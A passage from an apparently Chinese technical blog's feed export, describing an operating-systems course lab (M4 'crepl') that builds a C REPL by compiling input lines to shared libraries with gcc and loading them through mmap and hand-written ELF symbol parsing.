如果是bmp文件格式，则返回1</span></span><br><span class="line"><span class="comment"> * 否则返回0即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">is_bmp</span><span class="params">(<span class="type">const</span> BMP *bmp, <span class="type">const</span> <span class="type">uint64_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(bmp-&gt;magic_number[<span class="number">0</span>] == <span class="number">0x42</span> &amp;&amp; bmp-&gt;magic_number[<span class="number">1</span>] == <span class="number">0x4d</span> &amp;&amp; bmp-&gt;size == size) &#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><p>  下面是测试官方样例的结果<br>  <img src="实验结果.png" alt="实验结果"></p>]]></content>
      
      
      <categories>
          
          <category> 手写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 手写 </tag>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统-设计与实现-七</title>
      <link href="/2021/12/01/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0-%E4%B8%83/"/>
      <url>/2021/12/01/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0-%E4%B8%83/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  终于结束了痛苦的<strong>L2</strong>，虽然感觉确实学到了很多东西。这篇博客完成<strong>M4</strong>实验</p><h1 id="M4-C-Real-Eval-Print-Loop-crepl"><a href="#M4-C-Real-Eval-Print-Loop-crepl" class="headerlink" title="M4 C-Real-Eval-Print-Loop(crepl)"></a>M4 C-Real-Eval-Print-Loop(crepl)</h1><h2 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h2><p>  很多编程语言都提供了交互式的<strong>read-eval-print-loop</strong>(REPL)，更俗一点的名字就是”交互的shell”。例如在命令行中输入<strong>python</strong>，就可以和<strong>Python shell</strong>交互了。现代程序设计语言都提供类似的措施，即便是非解释型的程序设计语言，也提供了类似的措施，例如<strong>Scala REPL</strong>、<strong>go-eval</strong>等</p><p>  实际上，<strong>C</strong>这种编译型的语言，同样可以实现”交互式”的shell——即支持即使定义函数，并且可以计算<strong>C</strong>表达式的数值。如果输入一段代码，例如<code>strlen(&quot;Hello, World&quot;)</code>，这段代码会经历<strong>gcc</strong>编译、动态加载、调用执行，并最终讲代码执行得到的数值<strong>11</strong>，打印到屏幕上</p><p>  在本次实验中，将实现一个非常简单的<strong>C</strong>交互式<strong>shell</strong></p><h2 id="实验描述"><a href="#实验描述" class="headerlink" title="实验描述"></a>实验描述</h2><blockquote><p>crepl - 逐行从stdin中输入，根据内容进行处理：</p><ul><li>如果输入的一行定义了一个函数，则把函数编译并加载到进程的地址空间中</li><li>如果输入是一个表达式，则把它的值输出</li></ul><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>解释执行每一行标准输入中的C“单行”代码(假设我们只是用int类型，即所有输入的表达式都是整数；定义函数的返回值也永远是整数)，分如下两种情况：</p><ul><li><strong>函数</strong>总是以int开头，例如<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fib</span><span class="params">(<span class="type">int</span> n)</span> &#123; <span class="keyword">if</span> (n &lt;= <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>; <span class="keyword">return</span> fib(n - <span class="number">1</span>) + fib(n - <span class="number">2</span>); &#125;</span><br></pre></td></tr></table></figure>函数接收若干int类型的参数，返回一个int数值。如果一行是一个函数，则希望其将经过<strong>gcc</strong>编译，并被加载到当前进程的地址空间中。函数可以引用之前定义过的函数。</li><li>如果一行不是以int开头，可以认为这一行是一个<strong>C</strong>语言的<strong>表达式</strong>，其类型为<strong>int</strong>，例如<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> + <span class="number">2</span> || (fib(<span class="number">3</span>) * fib(<span class="number">4</span>))</span><br></pre></td></tr></table></figure></li></ul><p><strong>函数和表达式均可以调用之前定义过的函数</strong>，但不允许访问全局的状态(变量)或调用标准C中的函数。如果一行既不是合法的函数(例如调用了不允许调用的函数)，也不是合法的表达式，<strong>crepl</strong>可以不保证它们执行的结果(不一定要报告错误，例如程序可以照常编译或执行，但程序要尽量不会崩溃)；重复定义重命名函数，也可以当做undefined behavior，不必做出过多处理。</p><p>和之前的实验一样，并不严格限制程序的输出格式，只要每一个函数或表达式输出一行即可</p></blockquote><h2 id="实验标准"><a href="#实验标准" class="headerlink" title="实验标准"></a>实验标准</h2><p>  只要可以正确解析单行的函数(以int开头)，并且默认其他输入都是表达式即可。可能输入不合法的C代码(例如不合法的表达式)；程序应该给出错误提示，而非直接崩溃。</p><ul><li>注意允许函数和表达式调用之前(在crepl中)定义过的函数</li><li>将创建的临时文件都放在<strong>/tmp/</strong>目录下。可以使用<strong>mkstemp family API</strong>创建临时文件</li><li>禁止使用C标准库<code>system</code>和<code>popen</code>。这稍微增加了实验的难度，不过并没有增加多少</li></ul><h2 id="实验指南"><a href="#实验指南" class="headerlink" title="实验指南"></a>实验指南</h2><h3 id="解析读入的命令"><a href="#解析读入的命令" class="headerlink" title="解析读入的命令"></a>解析读入的命令</h3><p>  框架代码里，已经包含了读入命令的循环(看起来像是一个小shell)，其打印出一个提示符，然后接受输入，并进行解析<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">  <span class="type">static</span> <span class="type">char</span> line[<span class="number">4096</span>];</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;crepl&gt; &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fgets(line, <span class="keyword">sizeof</span>(line), <span class="built_in">stdin</span>)) &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got %zu chars.\n&quot;</span>, <span class="built_in">strlen</span>(line)); <span class="comment">// WTF?</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  当在终端里按下<strong>Ctrl-d</strong>，会结束stdin输入流，<strong>fgets</strong>会得到<strong>NULL</strong>。</p><p>  在上述代码里，如果读入的字符串以<strong>int</strong>开头，就可以假设是一个函数；否则就可以认为是一个表达式</p><h3 id="把函数编译成共享库"><a href="#把函数编译成共享库" class="headerlink" title="把函数编译成共享库"></a>把函数编译成共享库</h3><p>  对于一个一行的函数，例如<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">gcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123; <span class="keyword">return</span> b ? gcd(b, a % b) : a; &#125;</span><br></pre></td></tr></table></figure></p><p>  在之前课程中讲解过编译成共享库(shared object, so)的代码。该实验中，只需要讲文件保存到临时的文件里，例如a.c中，然后使用正确的选项调用<strong>gcc</strong>即可</p><blockquote><h4 id="选取合适的路径和文件名"><a href="#选取合适的路径和文件名" class="headerlink" title="选取合适的路径和文件名"></a>选取合适的路径和文件名</h4><p>如果工具在当前目录下创建文件，则有可能会失败——例如，程序可能会在一个没有访问权限的工作目录上(如文件系统的根/)。在<strong>/tmp</strong>中创建临时文件是更安全的做法。此外，<strong>glibc</strong>中还提供了<strong>mkstemp family</strong> API调动，帮助生成命名唯一的临时文件。</p></blockquote><p>  除了编译和命名的问题，另一个可能的困惑是，如果函数调用了其他函数怎么办？例如如下代码<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">foo</span><span class="params">()</span> &#123; <span class="keyword">return</span> bar() + baz(); &#125;</span><br></pre></td></tr></table></figure></p><p>  实际上，如果编译上述程序，其可以被编译！忽略所有的<strong>warnings</strong>即可</p><h3 id="把表达式编译成共享库"><a href="#把表达式编译成共享库" class="headerlink" title="把表达式编译成共享库"></a>把表达式编译成共享库</h3><p>  把函数编译成共享库是常规操作——库函数主要就是为我们提供函数的。<br>  而对于表达式，可以将其包装成函数，然后进行编译即可——例如<code>gcd(256, 144)</code><br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __expr_wrapper_4() &#123;</span><br><span class="line">    <span class="keyword">return</span> gcd(<span class="number">256</span>, <span class="number">144</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  注意到函数中的名称——可以通过数字为表达式生成不一样的名称。这样，输入的表达式就成为了一个函数，从而将其编译成共享库。</p><p>  如果将动态库加载到地址空间，并且得到<code>__expr_wrapper_4</code>的地址，则可以直接进行函数调用，从而获取表达式的值</p><h3 id="共享库的加载"><a href="#共享库的加载" class="headerlink" title="共享库的加载"></a>共享库的加载</h3><p>  实验中，可以使用<code>dlopen</code>加载共享库。在<strong>Makefile</strong>中，已经添加了<strong>-ldl</strong>的链接选项，可以通过阅读相关库函数的手册来学习，亦可以通过<code>man 5 elf</code>进行查看</p><h3 id="试试自己用mmap加载？"><a href="#试试自己用mmap加载？" class="headerlink" title="试试自己用mmap加载？"></a>试试自己用mmap加载？</h3><p>  我们可能会好奇<strong>dlopen</strong>等一系列函数，到底做了什么。<br>  实际上，可以自己<strong>hack</strong>一下该程序。</p><p>  我们可以假设函数仅仅访问局部变量，则可以通过解析<strong>ELF</strong>文件，将共享库的代码部分提取出来，甚至更简单的，只需要使用一个mmap将整个文件映射到地址空间中，并解析ELF文件中的符号，从而找到符号的对应地址即可。</p><p>  实际上，这样就实现了一个最简单的动态加载器！</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>  切换到<strong>master</strong>分支，然后从github上拉取M4实验即可<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add jyy https://hub.fastgit.org/NJU-ProjectN/os-workbench.git &amp;&amp; git checkout master &amp;&amp; git pull jyy M4</span><br></pre></td></tr></table></figure></p><h2 id="实验实现"><a href="#实验实现" class="headerlink" title="实验实现"></a>实验实现</h2><p>  下面是个人的思路及其实现，<a href="https://gitee.com/jiaweihawk/nju-os/tree/8e52b5ea689c16d3ea2580ff2d01036777a912fb">实验实现</a></p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>  实际上，处理函数，就是将其写入到临时源文件中，然后调用<strong>gcc</strong>编译成动态链接库文件，然后进行装载，并解析其中的导入符号和导出符号即可。</p><p>  虽然如此，过程中还有许多需要注意的细节——例如父进程处理子进程的异常信息等</p><h4 id="编译动态链接库文件"><a href="#编译动态链接库文件" class="headerlink" title="编译动态链接库文件"></a>编译动态链接库文件</h4><p>  实际上，将输入的函数编译成动态链接库文件还是非常方便的——将输入的函数内容写入到临时源文件中，然后执行<code>gcc -m32/-m64 -xc -fPIC -shared -o [dst] [src]</code>命令完成编译</p><p>  这里特别说明两点</p><ol><li>由于实验指南中允许使用<strong>execv</strong>家族的函数，这里就使用<strong>execvp</strong>，从而无需特别添加路径信息</li><li><p>可以通过<strong>readlink</strong>函数、<strong>/proc/self/fd/[fd]</strong>和传入的文件描述符，获取临时文件的真实路径信息</p><p>其相关的实现代码如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 即将line写入到给定的文件描述符中</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 仅仅在子进程中调用，因此如果出现异常，直接kill即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">write_to_file</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *line, <span class="type">const</span> <span class="type">int</span> fd)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(line == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> remain_size = <span class="built_in">strlen</span>(line),  write_size = <span class="number">0</span>, idx = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(remain_size) &#123;</span><br><span class="line">    write_size = write(fd, line + idx, remain_size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(write_size &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      dprintf(STDERR_FILENO, <span class="string">&quot;%s\n&quot;</span>, strerror(errno));</span><br><span class="line">      kill(getpid(), SIGCHLD);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    remain_size -= write_size;</span><br><span class="line">    idx += write_size;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(fsync(fd) != <span class="number">0</span>) &#123;</span><br><span class="line">      dprintf(STDERR_FILENO, <span class="string">&quot;%s\n&quot;</span>, strerror(errno));</span><br><span class="line">      kill(getpid(), SIGCHLD);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 执行gcc -xc -fPIC -shared -o </span></span><br><span class="line"><span class="comment"> * 这里需要根据源文件和目标文件的fd，获取其路径信息，从而完成上述命令</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 由于在子进程中执行，因此如果出现异常，直接kill即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">compiler_libso</span><span class="params">(<span class="type">const</span> <span class="type">int</span> src, <span class="type">const</span> <span class="type">int</span> dst)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buf[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">char</span> src_path[BUF_SIZE] = &#123;<span class="number">0</span>&#125;, dst_path[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">snprintf</span>(buf, BUF_SIZE, <span class="string">&quot;/proc/self/fd/%d&quot;</span>, src);</span><br><span class="line">  <span class="keyword">if</span>(readlink(buf, src_path, BUF_SIZE) == <span class="number">-1</span>) &#123;</span><br><span class="line">    dprintf(STDERR_FILENO, <span class="string">&quot;%s\n&quot;</span>, strerror(errno));</span><br><span class="line">    kill(getpid(), SIGCHLD);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">snprintf</span>(buf, BUF_SIZE, <span class="string">&quot;/proc/self/fd/%d&quot;</span>, dst);</span><br><span class="line">  <span class="keyword">if</span>(readlink(buf, dst_path, BUF_SIZE) == <span class="number">-1</span>) &#123;</span><br><span class="line">    dprintf(STDERR_FILENO, <span class="string">&quot;%s\n&quot;</span>, strerror(errno));</span><br><span class="line">    kill(getpid(), SIGCHLD);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *args[] = &#123;</span><br><span class="line">    <span class="string">&quot;gcc&quot;</span>,</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined __x86_64__</span></span><br><span class="line">    <span class="string">&quot;-m64&quot;</span>,</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined __i386__</span></span><br><span class="line">    <span class="string">&quot;-m32&quot;</span>,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="string">&quot;-w&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-xc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-fPIC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-shared&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-o&quot;</span>,</span><br><span class="line">    dst_path,</span><br><span class="line">    src_path,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 实验指南中允许调用exec家族</span></span><br><span class="line"><span class="comment">   * 那么为了方便起见，直接调用execvp即可</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span>(execvp(args[<span class="number">0</span>], args) == <span class="number">-1</span>) &#123;</span><br><span class="line">    dprintf(STDERR_FILENO, <span class="string">&quot;%s\n&quot;</span>, strerror(errno));</span><br><span class="line">    kill(getpid(), SIGCHLD);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 即子进程编译函数为动态链接库</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 这里直接写入函数即可，无需过多包装</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 然后编译即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">compile_fun</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *line, <span class="type">const</span> <span class="type">int</span> fd)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">int</span> src_file;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">//首先申请一个临时源文件，用来存放待编译的源文件</span></span><br><span class="line">  init_temp_file_name(buf, <span class="string">&quot;/tmp/crepl-src&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>((src_file = mkstemp(buf)) == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="comment">//初始化失败，则输出错误信息即</span></span><br><span class="line">    dprintf(STDERR_FILENO, <span class="string">&quot;%s\n&quot;</span>, strerror(errno));</span><br><span class="line">    kill(getpid(), SIGCHLD);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//直接写入表达式</span></span><br><span class="line">  write_to_file(line, src_file);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">//然后编译即可</span></span><br><span class="line">  compiler_libso(src_file, fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="装载动态链接库"><a href="#装载动态链接库" class="headerlink" title="装载动态链接库"></a>装载动态链接库</h4><p>  实际上，装载动态链接库，就是通过<strong>mmap</strong>函数，将前面编译好的动态链接库映射入内存中即可，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 载入子进程编译完成的动态链接库</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 路径根据fd，然后调用readlink获取即可</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 如果成功载入，则返回载入的地址</span></span><br><span class="line"><span class="comment"> * 否则，处理异常并返回NULL即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>*</span><br><span class="line"><span class="title function_">load_libso</span><span class="params">(<span class="type">const</span> <span class="type">int</span> fd)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *res = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">sb</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取文件大小</span></span><br><span class="line">  <span class="keyword">if</span>(fstat(fd, &amp;sb) == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="type">char</span> buf[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">snprintf</span>(buf, BUF_SIZE, <span class="string">&quot;%s\n&quot;</span>, strerror(errno));</span><br><span class="line">    crepl_print(CREPL_PRINT_MODE_FAIL, buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 这里特别提一下prot字段</span></span><br><span class="line"><span class="comment">   * 子进程执行完编译后，fd对应的文件模式就是711</span></span><br><span class="line"><span class="comment">   * 而fd打开的模式是O_RDWR | O_CREAT | O_EXCL</span></span><br><span class="line"><span class="comment">   * </span></span><br><span class="line"><span class="comment">   * 这里以PROT_READ | PROT_WRITE | PROT_EXEC实际上并不冲突，虽然不知道为什么</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span>((res = mmap(<span class="literal">NULL</span>, sb.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE, fd, <span class="number">0</span>)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="type">char</span> buf[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">snprintf</span>(buf, BUF_SIZE, <span class="string">&quot;%s\n&quot;</span>, strerror(errno));</span><br><span class="line">    crepl_print(CREPL_PRINT_MODE_FAIL, buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> lib</span></span><br><span class="line">  <span class="type">char</span> buf[BUF_SIZE] = &#123;<span class="number">0</span>&#125;, path[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="built_in">snprintf</span>(buf, BUF_SIZE, <span class="string">&quot;/proc/self/fd/%d&quot;</span>, fd);</span><br><span class="line">  readlink(buf, path, BUF_SIZE);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;load the %s at %p\n&quot;</span>, path, res);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="解析动态链接库"><a href="#解析动态链接库" class="headerlink" title="解析动态链接库"></a>解析动态链接库</h4><p>  解析动态链接库，主要通过<code>man 5 elf</code>，获取相关的资料即可，并进行解析即可</p><p>  实际上，解析动态链接库，主要就是解析动态链接库的符号，也就是处理动态链接库的<strong>导入符号</strong>和<strong>导出符号</strong></p><ol><li><p>导出符号<br>处理导出符号，就是将其动态链接库中的全局函数类型的符号名称和符号地址记录下来即可<br>具体来说，这里的导出符号在<strong>.dynsym</strong>段中，其段是一个数组，数组元素的结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span>      st_name;</span><br><span class="line">    Elf32_Addr    st_value;</span><br><span class="line">    <span class="type">uint32_t</span>      st_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> st_info;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> st_other;</span><br><span class="line">    <span class="type">uint16_t</span>      st_shndx;</span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span>      st_name;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> st_info;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> st_other;</span><br><span class="line">    <span class="type">uint16_t</span>      st_shndx;</span><br><span class="line">    Elf64_Addr    st_value;</span><br><span class="line">    <span class="type">uint64_t</span>      st_size;</span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure><p>其中，重点在<strong>st_name</strong>字段和<strong>st_value</strong>字段：<strong>st_name</strong>字段表示符号名称在<strong>.dynstr</strong>字符串表中的下标；<br><strong>st_value</strong>表示符号地址相对动态链接库载入的地址的偏移。通过这些，即可确定一个导出符号的名称及其符号地址</p></li><li><p>导入符号<br>处理导入符号，就是将其依赖库的对应的<strong>解析过的导出符号</strong>的地址，覆盖到对应的信息中。<br>具体来说，导入符号在<strong>.rela.plt</strong>/<strong>.rel.plt</strong>段中，其段是一个数组，元素结构如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 